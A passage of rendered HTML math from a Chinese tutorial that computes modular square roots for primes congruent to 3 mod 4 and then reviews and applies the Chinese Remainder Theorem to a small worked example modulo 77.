mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">7</span></span></span></span></p><p>然后根据模4余三素数的结论</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mo>±</mo><mn>2</mn><msup><mn>3</mn><mrow><mn>12</mn><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>11</mn><mo>=</mo><mo>±</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">m=\pm23^{12/4}\ mod\ 11=\pm1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9713299999999999em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">/</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">1</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mo>±</mo><mn>2</mn><msup><mn>3</mn><mrow><mn>8</mn><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>7</mn><mo>=</mo><mo>±</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">m=\pm 23^{8/4}\ mod\ 7=\pm4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9713299999999999em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mtight">/</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord">4</span></span></span></span></p><p>这里进行运算的时候，比如第一个式子，因为是模11意义下的，所以23直接就是1，所以直接得出结果了，十分方便。</p><p>接下来我们复习一下中国剩余定理。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x=b_1\ mod\ m_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x=b_2\ mod\ m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>m</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m=m_1*m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><mi>m</mi><mn>2</mn><mo separator="true">,</mo><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">M_1=m2,M_2=m1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">m</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">1</span></span></span></span>。因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mi>i</mi></msub><mo>∗</mo><msub><mi>M</mi><mi>i</mi></msub><mo>=</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">m_i*M_i=m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span></p><p>求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>M</mi><mn>1</mn><mo mathvariant="normal">′</mo></msubsup><mo>=</mo><mi>i</mi><mi>n</mi><mi>v</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>m</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M_1&#x27;=invmod(M_1,m_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4518920000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>M</mi><mn>2</mn><mo mathvariant="normal">′</mo></msubsup><mo>=</mo><mi>i</mi><mi>n</mi><mi>v</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>m</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M_2&#x27;=invmod(M_2,m_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4518920000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>最后得解就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><msub><mi>M</mi><mn>1</mn></msub><msubsup><mi>M</mi><mn>1</mn><mo mathvariant="normal">′</mo></msubsup><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mi>M</mi><mn>2</mn></msub><msubsup><mi>M</mi><mn>2</mn><mo mathvariant="normal">′</mo></msubsup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=b_1M_1M_1&#x27;+b_2M_2M_2&#x27;\ mod(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4518920000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4518920000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></p><p>我们来算一下这道例子。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><mo>=</mo><mn>11</mn><mo separator="true">,</mo><msub><mi>m</mi><mn>2</mn></msub><mo>=</mo><mn>7</mn><mo separator="true">,</mo><mi>m</mi><mo>=</mo><mn>77</mn></mrow><annotation encoding="application/x-tex">m_1=11,m_2=7,m=77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">7</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><mn>7</mn><mo separator="true">,</mo><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mn>11</mn></mrow><annotation encoding="application/x-tex">M_1=7,M_2=11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>M</mi><mn>1</mn><mo mathvariant="normal">′</mo></msubsup><mo>=</mo><mn>8</mn><mo separator="true">,</mo><msubsup><mi>M</mi><mn>2</mn><mo mathvariant="normal">′</mo></msubsup><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">M_1&#x27;=8,M_2&#x27;=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4518920000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" 